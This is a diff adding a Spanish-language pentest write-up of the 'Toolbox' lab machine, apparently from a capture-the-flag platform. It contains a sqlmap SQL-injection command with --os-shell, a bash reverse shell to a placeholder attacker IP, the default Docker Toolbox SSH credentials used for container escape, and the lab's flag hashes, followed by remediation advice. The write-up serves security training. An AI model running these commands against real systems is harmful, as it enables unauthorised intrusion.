@@ -1,0 +1,102 @@
+Resumen Ejecutivo:
+
+Toolbox es una máquina de dificultad media que simula un entorno de infraestructura moderna donde las aplicaciones, 
+corren dentro de contenedores Docker sobre un host de Docker Toolbox (Tiny Core Linux). 
+El compromiso total se logró mediante una cadena de explotación que comenzó con una vulnerabilidad web y 
+terminó con un escape de contenedor mediante configuraciones por defecto.
+
+Metodología Aplicada:
+
+Este ejercicio se ha llevado a cabo siguiendo una metodología estructurada de Pentesting, asegurando la trazabilidad de cada paso:
+
+Reconocimiento y Enumeración: Identificación de activos y servicios.
+
+Análisis de Vulnerabilidades: Localización de fallos de seguridad (SQLi).
+
+Explotación: Ganancia de acceso inicial mediante RCE.
+
+Post-Explotación: Movimiento lateral, escape de contenedor y escalada de privilegios.
+
+Fase de Reconocimiento (Enumeración)
+
+El escaneo de puertos reveló servicios estándar:
+
+Port 22/tcp: OpenSSH
+
+Port 80/tcp: HTTP (Apache)
+
+Port 443/tcp: HTTPS (SSL)
+
+Tras la enumeración de subdominios, se identificó un portal administrativo en: https://admin.megalogistic.com
+
+Explotación (Initial Access):
+
+Inyección SQL (CWE-89)
+
+El formulario de autenticación era vulnerable a SQL Injection en el parámetro username. Se utilizó sqlmap para automatizar la explotación:
+
+sqlmap -u "https://admin.megalogistic.com/index.php" --data="username=admin&password=password" -p username --batch --os-shell --dbms=postgresql
+
+Ejecución de Comandos (RCE):
+
+A través de la función --os-shell de PostgreSQL, se estableció una Reverse Shell hacia la máquina del atacante (Kali Linux) para obtener una terminal más estable:
+
+En el atacante
+nc -lvnp 4444
+
+En el os-shell
+bash -c 'bash -i >& /dev/tcp/[IP_ATACANTE]/4444 0>&1'
+
+Movimiento Lateral (Container Escape)
+
+Una vez dentro, se identificó que el entorno estaba dockerizado mediante la presencia de archivos .dockerenv y la estructura de red.
+
+Identificación del Host: El Gateway de la red de Docker se encontraba en la IP 172.17.0.1.
+
+Explotación de Credenciales: Docker Toolbox utiliza credenciales por defecto para el acceso administrativo. 
+
+Se realizó una conexión SSH desde el contenedor hacia el host:
+
+ssh docker@172.17.0.1
+Password: tcuser
+
+Escalada de Privilegios (Privilege Escalation)
+
+Tras acceder al host (Tiny Core Linux), se auditó el archivo de configuración de sudoers. 
+Se detectó que el usuario docker tenía permisos de ejecución sin contraseña para todos los comandos.
+
+Comando de lectura de flags:
+
+sudo cat /c/Users/Administrator/Desktop/root.txt
+
+Flags y Evidencia:
+
+User	/var/lib/postgresql/user.txt	          f0183e44378ea9774433e2ca6ac78c6a
+
+Root	/c/Users/Administrator/Desktop/root.txt	cc9a0b76ac17f8f475250738b96261b3
+
+Análisis de Impacto:
+
+El riesgo identificado en esta auditoría se califica como CRÍTICO.
+
+Confidencialidad: Compromiso total de los datos almacenados en la base de datos PostgreSQL y archivos sensibles del host.
+
+Integridad: Capacidad de modificar cualquier archivo del sistema operativo.
+
+Disponibilidad: Acceso administrativo total que permitiría el borrado o cifrado (Ransomware) de la infraestructura.
+
+
+Recomendaciones de Seguridad (Remediación)
+
+Sanitización de Consultas: 
+
+Implementar Prepared Statements o ORMs para evitar la inyección de código SQL.
+
+Hardening de Infraestructura: 
+
+Cambiar las credenciales por defecto (tcuser) en entornos de Docker Toolbox y restringir el acceso SSH solo desde redes autorizadas.
+
+Principio de Menor Privilegio: 
+
+Configurar el archivo sudoers para permitir solo binarios específicos estrictamente necesarios, en lugar de acceso total NOPASSWD: ALL.
+
